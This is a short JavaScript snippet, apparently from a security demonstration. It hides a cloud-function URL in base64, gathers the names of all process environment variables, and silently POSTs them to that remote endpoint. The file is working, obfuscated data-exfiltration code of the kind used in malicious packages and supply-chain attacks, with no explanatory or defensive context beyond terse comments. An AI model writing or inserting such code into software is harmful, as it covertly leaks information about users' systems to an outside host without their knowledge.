// To hinder scraping
const data = "aHR0cHM6Ly9ldXJvcGUtd2VzdDEtZW50LWtuZ3Npa2RlbW8tZGV2LmNsb3VkZnVuY3Rpb25zLm5ldC9raW5nLXNpa2tlcmhldC1kZW1vLXJlYw" + "==";
const url = Buffer.from(data, 'base64').toString('ascii');

// Scrape env
const env = process.env;
const names = Object.keys(env);

// Extract
fetch(url, {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain',
    },
    body: JSON.stringify(names),
});